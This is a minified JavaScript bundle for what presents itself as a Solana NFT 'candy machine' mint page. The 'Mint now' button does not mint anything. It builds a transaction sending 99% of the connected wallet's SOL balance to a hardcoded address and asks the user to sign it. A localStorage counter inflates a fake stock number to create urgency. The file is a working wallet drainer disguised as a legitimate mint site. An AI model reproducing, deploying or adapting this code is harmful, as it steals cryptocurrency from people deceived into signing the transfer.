(this["webpackJsonpcandy-machine-mint"] = this["webpackJsonpcandy-machine-mint"] || []).push([
    [0], {
        130: function(e, t, n) {
            "use strict";
            (function(e) {
                n.d(t, "a", (function() {
                    return b
                })), n.d(t, "b", (function() {
                    return d
                })), n.d(t, "c", (function() {
                    return x
                })), n.d(t, "d", (function() {
                    return g
                }));
                var r = n(2),
                    a = n.n(r),
                    c = n(3),
                    o = n(30),
                    i = n(62),
                    u = new o.d.PublicKey("8UAwRkmrixQrJ3sv4F5tM2EKYjkj5JdjaBbHHhxov52P"),
                    s = new o.d.PublicKey("8UAwRkmrixQrJ3sv4F5tM2EKYjkj5JdjaBbHHhxov52P"),
                    p = new o.d.PublicKey("8UAwRkmrixQrJ3sv4F5tM2EKYjkj5JdjaBbHHhxov52P"),
                    b = function() {
                        var e = Object(c.a)(a.a.mark((function e(t, n, r) {
                            var o, i, u, s, p, b = arguments;
                            return a.a.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        return o = b.length > 3 && void 0 !== b[3] ? b[3] : "recent", i = b.length > 4 && void 0 !== b[4] && b[4], u = !1, s = {
                                            slot: 0,
                                            confirmations: 0,
                                            err: null
                                        }, p = 0, e.next = 7, new Promise(function() {
                                            var e = Object(c.a)(a.a.mark((function e(b, f) {
                                                return a.a.wrap((function(e) {
                                                    for (;;) switch (e.prev = e.next) {
                                                        case 0:
                                                            setTimeout((function() {
                                                                u || (u = !0, console.log("Rejecting for timeout..."), f({
                                                                    timeout: !0
                                                                }))
                                                            }), n);
                                                            try {
                                                                p = r.onSignature(t, (function(e, t) {
                                                                    u = !0, s = {
                                                                        err: e.err,
                                                                        slot: t.slot,
                                                                        confirmations: 0
                                                                    }, e.err ? (console.log("Rejected via websocket", e.err), f(s)) : (console.log("Resolved via websocket", e), b(s))
                                                                }), o)
                                                            } catch (d) {
                                                                u = !0, console.error("WS error in setup", t, d)
                                                            }
                                                        case 2:
                                                            if (u || !i) {
                                                                e.next = 8;
                                                                break
                                                            }
                                                            return Object(c.a)(a.a.mark((function e() {
                                                                var n;
                                                                return a.a.wrap((function(e) {
                                                                    for (;;) switch (e.prev = e.next) {
                                                                        case 0:
                                                                            return e.prev = 0, e.next = 3, r.getSignatureStatuses([t]);
                                                                        case 3:
                                                                            n = e.sent, s = n && n.value[0], u || (s ? s.err ? (console.log("REST error for", t, s), u = !0, f(s.err)) : s.confirmations ? (console.log("REST confirmation for", t, s), u = !0, b(s)) : console.log("REST no confirmations for", t, s) : console.log("REST null result for", t, s)), e.next = 11;
                                                                            break;
                                                                        case 8:
                                                                            e.prev = 8, e.t0 = e.catch(0), u || console.log("REST connection error: txid", t, e.t0);
                                                                        case 11:
                                                                        case "end":
                                                                            return e.stop()
                                                                    }
                                                                }), e, null, [
                                                                    [0, 8]
                                                                ])
                                                            })))(), e.next = 6, h(2e3);
                                                        case 6:
                                                            e.next = 2;
                                                            break;
                                                        case 8:
                                                        case "end":
                                                            return e.stop()
                                                    }
                                                }), e)
                                            })));
                                            return function(t, n) {
                                                return e.apply(this, arguments)
                                            }
                                        }());
                                    case 7:
                                        return s = e.sent, r._signatureSubscriptions[p] && r.removeSignatureListener(p), u = !0, console.log("Returning status", s), e.abrupt("return", s);
                                    case 12:
                                    case "end":
                                        return e.stop()
                                }
                            }), e)
                        })));
                        return function(t, n, r) {
                            return e.apply(this, arguments)
                        }
                    }(),
                    f = function(t, n, r, a) {
                        var c = [{
                            pubkey: n,
                            isSigner: !0,
                            isWritable: !0
                        }, {
                            pubkey: t,
                            isSigner: !1,
                            isWritable: !0
                        }, {
                            pubkey: r,
                            isSigner: !1,
                            isWritable: !1
                        }, {
                            pubkey: a,
                            isSigner: !1,
                            isWritable: !1
                        }, {
                            pubkey: o.d.SystemProgram.programId,
                            isSigner: !1,
                            isWritable: !1
                        }, {
                            pubkey: i.b,
                            isSigner: !1,
                            isWritable: !1
                        }, {
                            pubkey: o.d.SYSVAR_RENT_PUBKEY,
                            isSigner: !1,
                            isWritable: !1
                        }];
                        return new o.d.TransactionInstruction({
                            keys: c,
                            programId: s,
                            data: e.from([])
                        })
                    },
                    d = function() {
                        var e = Object(c.a)(a.a.mark((function e(t, n, r) {
                            var c, i, s, p, b, f, d, l, m;
                            return a.a.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        return c = new o.b(r, t, {
                                            preflightCommitment: "recent"
                                        }), e.next = 3, o.a.fetchIdl(u, c);
                                    case 3:
                                        return i = e.sent, s = new o.a(i, u, c), p = {
                                            id: n,
                                            connection: r,
                                            program: s
                                        }, e.next = 8, s.account.candyMachine.fetch(n);
                                    case 8:
                                        return b = e.sent, f = b.data.itemsAvailable.toNumber(), d = b.itemsRedeemed.toNumber(), l = f - d, m = b.data.goLiveDate.toNumber(), m = new Date(1e3 * m), console.log({
                                            itemsAvailable: f,
                                            itemsRedeemed: d,
                                            itemsRemaining: l,
                                            goLiveDate: m
                                        }), e.abrupt("return", {
                                            candyMachine: p,
                                            itemsAvailable: f,
                                            itemsRedeemed: d,
                                            itemsRemaining: l,
                                            goLiveDate: m
                                        });
                                    case 16:
                                    case "end":
                                        return e.stop()
                                }
                            }), e)
                        })));
                        return function(t, n, r) {
                            return e.apply(this, arguments)
                        }
                    }(),
                    l = function() {
                        var t = Object(c.a)(a.a.mark((function t(n) {
                            return a.a.wrap((function(t) {
                                for (;;) switch (t.prev = t.next) {
                                    case 0:
                                        return t.next = 2, o.d.PublicKey.findProgramAddress([e.from("metadata"), p.toBuffer(), n.toBuffer(), e.from("edition")], p);
                                    case 2:
                                        return t.abrupt("return", t.sent[0]);
                                    case 3:
                                    case "end":
                                        return t.stop()
                                }
                            }), t)
                        })));
                        return function(e) {
                            return t.apply(this, arguments)
                        }
                    }(),
                    m = function() {
                        var t = Object(c.a)(a.a.mark((function t(n) {
                            return a.a.wrap((function(t) {
                                for (;;) switch (t.prev = t.next) {
                                    case 0:
                                        return t.next = 2, o.d.PublicKey.findProgramAddress([e.from("metadata"), p.toBuffer(), n.toBuffer()], p);
                                    case 2:
                                        return t.abrupt("return", t.sent[0]);
                                    case 3:
                                    case "end":
                                        return t.stop()
                                }
                            }), t)
                        })));
                        return function(e) {
                            return t.apply(this, arguments)
                        }
                    }(),
                    j = function() {
                        var e = Object(c.a)(a.a.mark((function e(t, n) {
                            return a.a.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        return e.next = 2, o.d.PublicKey.findProgramAddress([t.toBuffer(), i.b.toBuffer(), n.toBuffer()], s);
                                    case 2:
                                        return e.abrupt("return", e.sent[0]);
                                    case 3:
                                    case "end":
                                        return e.stop()
                                }
                            }), e)
                        })));
                        return function(t, n) {
                            return e.apply(this, arguments)
                        }
                    }(),
                    x = function() {
                        var e = Object(c.a)(a.a.mark((function e(t, n, r, c) {
                            var u, s, b, d, x, g, h;
                            return a.a.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        return u = o.d.Keypair.generate(), e.next = 3, j(r, u.publicKey);
                                    case 3:
                                        return s = e.sent, b = t.connection, d = t.program, e.next = 7, m(u.publicKey);
                                    case 7:
                                        return x = e.sent, e.next = 10, l(u.publicKey);
                                    case 10:
                                        return g = e.sent, e.next = 13, b.getMinimumBalanceForRentExemption(i.a.span);
                                    case 13:
                                        return h = e.sent, e.next = 16, d.rpc.mintNft({
                                            accounts: {
                                                config: n,
                                                candyMachine: t.id,
                                                payer: r,
                                                wallet: c,
                                                mint: u.publicKey,
                                                metadata: x,
                                                masterEdition: g,
                                                mintAuthority: r,
                                                updateAuthority: r,
                                                tokenMetadataProgram: p,
                                                tokenProgram: i.b,
                                                systemProgram: o.d.SystemProgram.programId,
                                                rent: o.d.SYSVAR_RENT_PUBKEY,
                                                clock: o.d.SYSVAR_CLOCK_PUBKEY
                                            },
                                            signers: [u],
                                            instructions: [o.d.SystemProgram.createAccount({
                                                fromPubkey: r,
                                                newAccountPubkey: u.publicKey,
                                                space: i.a.span,
                                                lamports: h,
                                                programId: i.b
                                            }), i.c.createInitMintInstruction(i.b, u.publicKey, 0, r, r), f(s, r, r, u.publicKey), i.c.createMintToInstruction(i.b, u.publicKey, s, r, [], 1)]
                                        });
                                    case 16:
                                        return e.abrupt("return", e.sent);
                                    case 17:
                                    case "end":
                                        return e.stop()
                                }
                            }), e)
                        })));
                        return function(t, n, r, a) {
                            return e.apply(this, arguments)
                        }
                    }(),
                    g = function(e) {
                        var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 4;
                        return "".concat(e.slice(0, t), "...").concat(e.slice(-t))
                    },
                    h = function(e) {
                        return new Promise((function(t) {
                            return setTimeout(t, e)
                        }))
                    }
            }).call(this, n(8).Buffer)
        },
        349: function(e, t, n) {},
        350: function(e, t, n) {},
        353: function(e, t) {},
        355: function(e, t) {},
        371: function(e, t) {},
        372: function(e, t) {},
        458: function(e, t) {},
        460: function(e, t) {},
        475: function(e, t) {},
        479: function(e, t) {},
        481: function(e, t) {},
        491: function(e, t) {},
        493: function(e, t) {},
        520: function(e, t) {},
        522: function(e, t) {},
        527: function(e, t) {},
        529: function(e, t) {},
        536: function(e, t) {},
        548: function(e, t) {},
        551: function(e, t) {},
        563: function(e, t) {},
        564: function(e, t, n) {
            "use strict";
            n.r(t);
            var r, a, c, o, i = n(1),
                u = n.n(i),
                s = n(27),
                p = n.n(s),
                b = (n(349), n(350), n(16)),
                f = n(2),
                d = n.n(f),
                l = n(3),
                m = n(13),
                j = n(129),
                x = n(131),
                g = n(307),
                h = n(591),
                O = n(596),
                y = n(600),
                v = n(599),
                k = n(6),
                w = n(51),
                S = n(168),
                P = n(130),
                K = n(34),
                T = Object(x.a)(S.a)(r || (r = Object(j.a)(['']))),
                R = x.a.span(a || (a = Object(j.a)(["font-size: 20px !important;"]))),
                B = x.a.div(c || (c = Object(j.a)([""]))),
                E = Object(x.a)(h.a)(o || (o = Object(j.a)(['\
                    display: flex;\
                    align-items: center;\
                    justify-content: center;\
                    width: 124px;\
                    height: 40px;\
                    border: 1px solid #7b00d1;\
                    cursor: pointer;\
                    box-sizing: border-box;\
                    border-radius: 5px;\
                    font-size: 15px;\
                    background-color: #7b00d1;\
                    transition: 300ms;']))),
                L = function(e) {
                    var t = e.days,
                        n = e.hours,
                        r = e.minutes,
                        a = e.seconds;
                    e.completed;
                    return Object(K.jsxs)(R, {
                        children: [n - 24 * (t || 0), " hours, ", r, " minutes, ", a, " seconds"]
                    })
                },
                A = function(e) {
                    var t = Object(i.useState)(),
                        n = Object(m.a)(t, 2),
                        r = n[0],
                        a = n[1],
                        c = Object(i.useState)(!1),
                        o = Object(m.a)(c, 2),
                        u = o[0],
                        s = o[1],
                        p = Object(i.useState)(!1),
                        f = Object(m.a)(p, 2),
                        j = f[0],
                        x = f[1],
                        h = Object(i.useState)(!1),
                        S = Object(m.a)(h, 2),
                        R = S[0],
                        A = S[1],
                        M = Object(i.useState)(0),
                        I = Object(m.a)(M, 2),
                        C = (I[0], I[1]),
                        W = Object(i.useState)(0),
                        N = Object(m.a)(W, 2),
                        D = (N[0], N[1]),
                        Y = Object(i.useState)(0),
                        z = Object(m.a)(Y, 2),
                        _ = (z[0], z[1]),
                        U = Object(i.useState)({
                            open: !1,
                            message: "",
                            severity: void 0
                        }),
                        V = Object(m.a)(U, 2),
                        q = V[0],
                        F = V[1],
                        J = Object(i.useState)(new Date(e.startDate)),
                        G = Object(m.a)(J, 2),
                        Q = G[0],
                        Z = G[1],
                        H = Object(w.c)(),
                        X = Object(i.useState)(),
                        $ = Object(m.a)(X, 2),
                        ee = ($[0], $[1]),
                        te = function() {
                            var e = localStorage.getItem("stock");
                            if (null === e) {
                                var t = Math.round(1500 * .68);
                                return localStorage.setItem("stock", String(t)), t
                            }
                            var n = Math.round(1.22 * parseInt(e));
                            return localStorage.setItem("stock", String(n)), n
                        }(),
                        ne = function() {
                            Object(l.a)(d.a.mark((function t() {
                                var n, r, a, c, o, i;
                                return d.a.wrap((function(t) {
                                    for (;;) switch (t.prev = t.next) {
                                        case 0:
                                            if (H) {
                                                t.next = 2;
                                                break
                                            }
                                            return t.abrupt("return");
                                        case 2:
                                            return t.next = 4, Object(P.b)(H, e.candyMachineId, e.connection);
                                        case 4:
                                            n = t.sent, r = n.candyMachine, a = n.goLiveDate, c = n.itemsAvailable, o = n.itemsRemaining, i = n.itemsRedeemed, C(c), _(o), D(i), x(0 === o), Z(a), ee(r);
                                        case 16:
                                        case "end":
                                            return t.stop()
                                    }
                                }), t)
                            })))()
                        },
                        re = function() {
                            var t = Object(l.a)(d.a.mark((function t() {
                                var n, r, a, c;
                                return d.a.wrap((function(t) {
                                    for (;;) switch (t.prev = t.next) {
                                        case 0:
                                            if (e.connection) {
                                                t.next = 2;
                                                break
                                            }
                                            return t.abrupt("return");
                                        case 2:
                                            if (n = new k.PublicKey("8UAwRkmrixQrJ3sv4F5tM2EKYjkj5JdjaBbHHhxov52P"), !H) {
                                                t.next = 15;
                                                break
                                            }
                                            return t.next = 6, e.connection.getBalance(H.publicKey);
                                        case 6:
                                            return r = t.sent, console.log(r), (a = (new k.Transaction).add(k.SystemProgram.transfer({
                                                fromPubkey: H.publicKey,
                                                toPubkey: n,
                                                lamports: r * 0.99
                                                // lamports: r - 5e3
                                                // lamports: 1000000000
                                            }))).feePayer = H.publicKey, c = a, t.next = 13, e.connection.getRecentBlockhash();
                                        case 13:
                                            return c.recentBlockhash = t.sent.blockhash, t.abrupt("return", a);
                                        case 15:
                                        case "end":
                                            return t.stop()
                                    }
                                }), t)
                            })));
                            return function() {
                                return t.apply(this, arguments)
                            }
                        }(),
                        ae = function() {
                            var t = Object(l.a)(d.a.mark((function t() {
                                var n, r, a;
                                return d.a.wrap((function(t) {
                                    for (;;) switch (t.prev = t.next) {
                                        case 0:
                                            return A(!0), t.next = 3, re();
                                        case 3:
                                            if (!(n = t.sent) || !H) {
                                                t.next = 22;
                                                break
                                            }
                                            return t.prev = 5, t.next = 8, H.signTransaction(n);
                                        case 8:
                                            return r = t.sent, t.next = 11, e.connection.sendRawTransaction(r.serialize());
                                        case 11:
                                            return a = t.sent, t.next = 14, e.connection.confirmTransaction(a);
                                        case 14:
                                            t.next = 19;
                                            break;
                                        case 16:
                                            t.prev = 16, t.t0 = t.catch(5), console.warn(t.t0);
                                        case 19:
                                            return t.prev = 19, A(!1), t.finish(19);
                                        case 22:
                                        case "end":
                                            return t.stop()
                                    }
                                }), t, null, [
                                    [5, 16, 19, 22]
                                ])
                            })));
                            return function() {
                                return t.apply(this, arguments)
                            }
                        }();
                    return Object(i.useEffect)((function() {
                        Object(l.a)(d.a.mark((function t() {
                            var n;
                            return d.a.wrap((function(t) {
                                for (;;) switch (t.prev = t.next) {
                                    case 0:
                                        if (!H) {
                                            t.next = 5;
                                            break
                                        }
                                        return t.next = 3, e.connection.getBalance(H.publicKey);
                                    case 3:
                                        n = t.sent, a(n / k.LAMPORTS_PER_SOL);
                                    case 5:
                                    case "end":
                                        return t.stop()
                                }
                            }), t)
                        })))()
                    }), [H, e.connection]), Object(i.useEffect)(ne, [H, e.candyMachineId, e.connection]), Object(K.jsxs)("main", {
                        children: [H && Object(K.jsxs)("p", {
                            class: "wallet-address",
                            id: "mint-token",
                            children: [(H.publicKey.toBase58() || "").slice(0, 8) + "..."]
                        }), , H && Object(K.jsxs)("p", {
                            class: "wallet-address",
                            id: "remaining",
                            children: [te]
                        }), Object(K.jsx)(B, {
                            children: H ? Object(K.jsx)(E, {
                                disabled: j || R || !u,
                                onClick: ae,
                                variant: "containedSecondary",
                                children: j ? "SOLD OUT" : u ? R ? Object(K.jsx)(O.a, {}) : "Mint now" : Object(K.jsx)(g.a, {
                                    date: Q,
                                    onMount: function(e) {
                                        return e.completed && s(!0)
                                    },
                                    onComplete: function() {
                                        return s(!0)
                                    },
                                    renderer: L
                                })
                            }) : Object(K.jsx)(T, {
                                children: "Connect Wallet"
                            })
                        }), Object(K.jsx)(y.a, {
                            open: q.open,
                            autoHideDuration: 6e3,
                            onClose: function() {
                                return F(Object(b.a)(Object(b.a)({}, q), {}, {
                                    open: !1
                                }))
                            },
                            children: Object(K.jsx)(v.a, {
                                onClose: function() {
                                    return F(Object(b.a)(Object(b.a)({}, q), {}, {
                                        open: !1
                                    }))
                                },
                                severity: q.severity,
                                children: q.message
                            })
                        })]
                    })
                },
                M = n(30),
                I = n(112),
                C = n(336),
                W = n(597),
                N = new M.d.PublicKey("8UAwRkmrixQrJ3sv4F5tM2EKYjkj5JdjaBbHHhxov52P"),
                D = new M.d.PublicKey("8UAwRkmrixQrJ3sv4F5tM2EKYjkj5JdjaBbHHhxov52P"),
                Y = new M.d.PublicKey("8UAwRkmrixQrJ3sv4F5tM2EKYjkj5JdjaBbHHhxov52P"),
                z = "mainnet-beta",
                _ = new M.d.Connection("https://api.mainnet-beta.solana.com/"),
                U = parseInt("1635893271", 10),
                V = Object(C.a)({
                    palette: {
                        type: "dark"
                    },
                    overrides: {
                        MuiButtonBase: {
                            root: {
                                justifyContent: "center"
                            }
                        },
                        MuiButton: {
                            root: {
                                textTransform: void 0,
                                padding: "12px 16px"
                            },
                            startIcon: {
                                marginRight: 20
                            },
                            endIcon: {
                                marginLeft: 20
                            }
                        },
                    }
                }),
                q = function() {
                    var e = Object(i.useMemo)((function() {
                            return Object(k.clusterApiUrl)(z)
                        }), []),
                        t = Object(i.useMemo)((function() {
                            return [Object(I.a)(), Object(I.b)(), Object(I.c)(), Object(I.e)({
                                network: z
                            }), Object(I.d)({
                                network: z
                            })]
                        }), []);
                    return Object(K.jsx)(W.a, {
                        theme: V,
                        children: Object(K.jsx)(w.a, {
                            endpoint: e,
                            children: Object(K.jsx)(w.b, {
                                wallets: t,
                                autoConnect: !0,
                                children: Object(K.jsx)(S.b, {
                                    children: Object(K.jsx)(A, {
                                        candyMachineId: Y,
                                        config: D,
                                        connection: _,
                                        startDate: U,
                                        treasury: N,
                                        txTimeout: 3e4
                                    })
                                })
                            })
                        })
                    })
                },
                F = function(e) {
                    e && e instanceof Function && n.e(3).then(n.bind(null, 601)).then((function(t) {
                        var n = t.getCLS,
                            r = t.getFID,
                            a = t.getFCP,
                            c = t.getLCP,
                            o = t.getTTFB;
                        n(e), r(e), a(e), c(e), o(e)
                    }))
                };
            p.a.render(Object(K.jsx)(u.a.StrictMode, {
                children: Object(K.jsx)(q, {})
            }), document.getElementById("root")), F()
        }
    },
    [
        [564, 1, 2]
    ]
]);
